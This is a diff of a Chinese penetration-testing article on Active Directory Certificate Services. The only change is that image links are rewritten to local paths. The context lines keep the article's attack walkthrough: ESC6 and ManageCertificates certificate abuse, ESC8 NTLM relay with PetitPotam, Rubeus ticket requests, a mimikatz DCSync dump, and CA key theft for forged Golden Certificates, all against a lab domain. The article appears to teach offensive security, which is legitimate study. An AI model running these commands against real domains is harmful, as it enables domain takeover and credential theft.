 要滥用这一点，只需将 `/altname` 标志与任何允许域身份验证的模板一起使用。在这种情况下，让我们使用 User 模板（它默认不允许我们指定主题名称），并为域管理员用户 Administrator 申请证书。
 
@@ -729,7 +729,7 @@ Certify 的 `find` 命令也将尝试检查它枚举的每个 CA 证书颁发机
 C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:User /altname:PENTEST\Administrator
 ```
 
-![](https://s2.loli.net/2022/03/25/hvyIO4lA2tqoB56.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/hvyIO4lA2tqoB56.png)
 
 如果您在自己的 AD CS 环境中发现了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 设置，可以使用以下命令删除此标志：
 
@@ -741,7 +741,7 @@ C:\Users\Marcus\Desktop> certutil -config "CA_HOST\CA_NAME" -setreg "policy\Edit
 
 除了证书模板之外，证书颁发机构本身也具有一组保护各种 CA 操作的权限。可以从 `certsrv.msc` 中右键单击 CA，选择 “属性”，然后切换到 “安全” 选项卡即可访问这些权限，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/pThyPevm8YKgDES.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/pThyPevm8YKgDES.png)
 
 这里的两个主要权限是 “管理 CA”（ManageCA）权限和 “颁发和管理证书”（ManageCertificates）权限，拥有这两个权限的用户分别对应于 “CA 管理员” 和 “证书管理员”（有时称为 CA 官员）。
 
@@ -752,7 +752,7 @@ Import-Module -Name PSPKI
 Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-CertificationAuthorityAcl | select -expand Access
 ```
 
-![](https://s2.loli.net/2022/03/25/SjmNUkJsBo4CFnD.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/SjmNUkJsBo4CFnD.png)
 
 Microsoft 和其他文献中对这些角色/权限进行了细分，但很难确定每个权限的确切安全含义。具体来说，很难确定攻击者如何远程滥用这些权限。技术规范 “*[MS-CSRA]: Certificate Services Remote Administration Protocol*” 在 “*3.1.1.7 Permissions*” 章节部分详细说明了 “CA 管理员” 和 “证书管理员” 权限可以针对 CA 远程执行的相关 DCOM 方法。
 
@@ -772,7 +772,7 @@ $ConfigReader.SetConfigEntry(1376590, "PolicyModules\CertificateAuthority_Micros
 certutil -config "DC01.pentest.com\pentest-DC01-CA" -getreg "policy\EditFlags"
 ```
 
-![](https://s2.loli.net/2022/03/25/Qk8i5C6PG9VEMYB.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Qk8i5C6PG9VEMYB.png)
 
 如上图所示，成功为 CA 启用了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志位，后续的利用方法请参考前文的 “CA EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6” 部分。
 
@@ -780,7 +780,7 @@ certutil -config "DC01.pentest.com\pentest-DC01-CA" -getreg "policy\EditFlags"
 
 下面，我们有一个名为 “ApproveReqTemplate” 的模板，其允许域身份验证并且在`mspki-certificate-name-flag` 属性中设置了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志。正常情况下我们可以按照前文 “Misconfigured Certificate Templates - ESC1” 的方法为域管理员的申请证书，但是该模板在发布要求中开启了 “CA 证书管理程序批准(C)” 保护，如下图所示。
 
-![](https://s2.loli.net/2022/03/25/7rStfeyHjpU2LTC.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/7rStfeyHjpU2LTC.png)
 
 那么我们所有针对该模板的注册请求都将被挂起，直到管理员在 certsrv.msc 的 “挂起的申请” 中对该请求予以 “颁发” 或 “拒绝”。
 
@@ -790,7 +790,7 @@ certutil -config "DC01.pentest.com\pentest-DC01-CA" -getreg "policy\EditFlags"
 C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:ApproveReqTemplate /altname:PENTEST\Administrator
 ```
 
-![](https://s2.loli.net/2022/03/25/jWJbUhs6tPIT83v.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/jWJbUhs6tPIT83v.png)
 
 此时，我们利用当前用户所拥有的 ManageCertificates 权限，通过 PSPKI Cmdlet 对 Request ID 为 56 的注册请求予以批准，相关命令如下。如下图所示，证书注册请求被 “颁发”。
 
@@ -799,7 +799,7 @@ Import-Module PSPKI
 Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-PendingRequest -RequestID 56 | Approve-CertificateRequest
 ```
 
-![](https://s2.loli.net/2022/03/25/6hfeIScAmklH5Rw.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/6hfeIScAmklH5Rw.png)
 
 然后再次通过 Certify 申请证书，并指定 Request ID 为 56，如下图所示，成功为 Administrator 用户注册到了 ApproveReqTemplate 模板的证书。
 
@@ -807,13 +807,13 @@ Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-PendingRequest -
 C:\Users\Marcus\Desktop> Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /id:56
 ```
 
-![](https://s2.loli.net/2022/03/25/oy6G9raBn8uPl4i.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/oy6G9raBn8uPl4i.png)
 
 ### 0.6.8 NTLM Relay to AD CS HTTP Endpoints – ESC8
 
 在前文中我们曾介绍过，管理员可以安装的 AD CS 服务器角色支持多种基于 HTTP 协议的证书注册方法，如下图所示。这些基于 HTTP 的证书注册接口易受 NTLM 中继（NTLM Relay）攻击。使用 NTLM Relay，失陷机器上的攻击者可以冒充任何 AD 帐户。 在冒充受害者帐户时，攻击者可以访问这些 Web 界面并根据用户/机器证书模板请求启用域身份验证的证书。
 
-![](https://s2.loli.net/2022/03/25/iIqK8rUpGmQ4ByH.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/iIqK8rUpGmQ4ByH.png)
 
 Relay To AD CS 的攻击方案是完全可以实现的，因为这些证书注册 Web 接口支持 NTLM 身份验证并且没有启用任何 NTLM Relay 保护措施：
 
@@ -847,7 +847,7 @@ python3 ntlmrelayx.py -t http://172.26.10.12/certsrv/certfnsh.asp -smb2support -
 # --template指定 AD CS 证书模板
 ```
 
-![](https://s2.loli.net/2022/03/27/YQwzSNTyt7HqiRg.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/YQwzSNTyt7HqiRg.png)
 
 然后执行以下命令，通过 PetitPotam 迫使域控制器向 Kali Linux 发起 NTLM 身份验证，如下图所示。
 
@@ -855,11 +855,11 @@ python3 ntlmrelayx.py -t http://172.26.10.12/certsrv/certfnsh.asp -smb2support -
 python3 PetitPotam.py -d pentest.com -u Marcus -p Marcus\@123 172.26.10.134 172.26.10.11
 ```
 
-![](https://s2.loli.net/2022/03/27/sHQFnZTR5yLwoYS.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/sHQFnZTR5yLwoYS.png)
 
 此时，ntlmrelayx.py 将截获域控机器账户 `DC01$` 的 Net-NTLM Hash，并将其中继到 ADCS 服务器的 Web 接口进行身份验证，之后将为 `DC01$` 帐户生成 Base64 格式的证书，如下图所示。
 
-![](https://s2.loli.net/2022/03/27/qnVOAN2Zxc6u8ri.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/qnVOAN2Zxc6u8ri.png)
 
 将得到的证书复制下来，通过 Rubeus 请求 TGT 票据。在域内普通用户的机器上执行以下命令，申请域控机器帐户的 TGT 票据，并将票据传递到内存中，如下所示。
 
@@ -867,11 +867,11 @@ python3 PetitPotam.py -d pentest.com -u Marcus -p Marcus\@123 172.26.10.134 172.
 C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:DC01$ /certificate:<Base64 Certificate> /ptt
 ```
 
-![](https://s2.loli.net/2022/03/27/3jCkNUMd4TcixPs.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/3jCkNUMd4TcixPs.png)
 
 此时执行 `klist` 命令，当前主机内存中已经保存了 `DC01$` 账户的 TGT 票据，如下图所示。
 
-![](https://s2.loli.net/2022/03/27/VAGgcWiKbBN3arh.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/VAGgcWiKbBN3arh.png)
 
 持有域控机器帐户的票据可以执行一些特权操作，例如通过 DCSync 转储域用户哈希，如下所示。
 
@@ -879,7 +879,7 @@ C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:DC01$ /certificate:<Base64 Cert
 C:\Users\Marcus\Desktop> mimikatz.exe "lsadump::dcsync /domain:pentest.com /user:pentest\administrator" exit
 ```
 
-![](https://s2.loli.net/2022/03/27/njViNrsHxTzKudG.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/njViNrsHxTzKudG.png)
 
 ## 0.7 域持久性
 
@@ -887,7 +887,7 @@ C:\Users\Marcus\Desktop> mimikatz.exe "lsadump::dcsync /domain:pentest.com /user
 
 CA 使用其私钥签署已颁发的证书。如果我们窃取了这个私钥，我们是否可以伪造自己的证书并使用它们以组织中任何人的身份向 AD 进行身份验证呢？答案是肯定的。最初，这项技术是由 [Benjamin Delpy](https://twitter.com/gentilkiwi) 在 Mimikatz 和 Kekeo 中实现，如下图所示。之后，Specterops 在其白皮书中再次讨论了这个话题，并发布了一个 [ForgeCert](https://github.com/GhostPack/ForgeCert) 工具，这是一个 C# 工具，它可以获取 CA 根证书并为我们指定的任何用户伪造新证书。
 
-![](https://s2.loli.net/2022/03/25/mYNXcI3g7RBfnhW.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/mYNXcI3g7RBfnhW.png)
 
 Specterops 将该项技术称为 “黄金证书”（Golden Certificates）。
 
@@ -906,17 +906,17 @@ Specterops 将该项技术称为 “黄金证书”（Golden Certificates）。
 C:\Users\Marcus\Desktop> Seatbelt.exe Certificates 
 ```
 
-![](https://s2.loli.net/2022/03/25/Ewmp3I9B1xq8eHg.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/Ewmp3I9B1xq8eHg.png)
 
 要提取 CA 证书及其私钥，可以使用 CA 服务器上的 `certsrv.msc` 备份整个 CA，如下图所示。这会将 CA 证书导出为 p12 文件。
 
-![](https://s2.loli.net/2022/03/25/9d6Qv8tbqCAImPT.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/9d6Qv8tbqCAImPT.png)
 
-![](https://s2.loli.net/2022/03/25/vPxALsf5kCz7Qc8.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/vPxALsf5kCz7Qc8.png)
 
-![](https://s2.loli.net/2022/03/25/WsQRpGwPOAjxerK.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/WsQRpGwPOAjxerK.png)
 
-![](https://s2.loli.net/2022/03/25/mLJZvfn9ypIrQEK.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/mLJZvfn9ypIrQEK.png)
 
 除了通过 CA 备份之外，还有其他方法可以提取私钥。CA 证书和私钥在加密方面与其他机器证书没有任何不同，所以如果我们在 CA 服务器上获得了提升的权限，我们就可以像前文中介绍的窃取其他证书/密钥一样来提取它们。
 
@@ -926,7 +926,7 @@ C:\Users\Marcus\Desktop> Seatbelt.exe Certificates
 C:\Users\Marcus\Desktop> mimikatz.exe "privilege::debug" "crypto::capi" "crypto::certificates /systemstore:local_machine /store:my /export" exit
 ```
 
-![](https://s2.loli.net/2022/03/25/wTyH9Ep5gIz732d.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/wTyH9Ep5gIz732d.png)
 
 此外，也可以适用 SharpDPAPI 来执行此类操作，相关命令如下。
 
@@ -934,7 +934,7 @@ C:\Users\Marcus\Desktop> mimikatz.exe "privilege::debug" "crypto::capi" "crypto:
 C:\Users\Marcus\Desktop> SharpDPAPI.exe certificates /machine
 ```
 
-![](https://s2.loli.net/2022/03/25/DvzWUaPb6o81KpB.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/DvzWUaPb6o81KpB.png)
 
 和之前一样，我们可以使用 openssl 将这个 .pem 格式的文本转换为可利用的 .pfx 格式，并保存为 ca.pfx 文件。有了这个包含 CA 证书和私钥 ca.pfx 文件后，攻击者可以将其上传到普通域成员机器上，并用它来伪造证书。
 
@@ -944,7 +944,7 @@ C:\Users\Marcus\Desktop> SharpDPAPI.exe certificates /machine
 C:\Users\Marcus\Desktop> ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "Passw0rd" --Subject "CN=User" --SubjectAltName "Administrator@pentest.com" --NewCertPath Administrator.pfx --NewCertPassword "NewPassw0rd"
 ```
 
-![](https://s2.loli.net/2022/03/25/PEflkojvz6Xa4ur.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/PEflkojvz6Xa4ur.png)
 
 如上图所示，最终生成的 Administrator.pfx 可用于前文所述的 SChannel 进行身份验证或使用 Rubeus 为伪造用户获取 TGT，如下所示。
 
@@ -952,7 +952,7 @@ C:\Users\Marcus\Desktop> ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "Pas
 C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:Administrator /certificate:C:\Users\Marcus\Administrator.pfx /password:NewPassw0rd /ptt
 ```
 
-![](https://s2.loli.net/2022/03/25/kOIwd5lActSgWNa.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/kOIwd5lActSgWNa.png)
 
 值得注意的是，伪造证书时指定的目标用户需要在 AD 中激活/启用并且能够进行身份验证，也就是域内的活动用户。因此，尝试为 krbtgt 帐户伪造证书是行不通的。
 
@@ -964,7 +964,7 @@ C:\Users\Marcus\Desktop> ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "Pas
 C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:DC01$ /certificate:C:\Users\Marcus\DC01.pfx /password:NewPassw0rd /ptt
 ```
 
-![](https://s2.loli.net/2022/03/25/plxa78fsHq3Ogjv.png)
+![](/assets/posts/2022-03-25-attack-surface-mining-for-ad-cs/plxa78fsHq3Ogjv.png)
 
 ### 0.7.2 Trusting Rogue CA Certificates - DPERSIST2
 
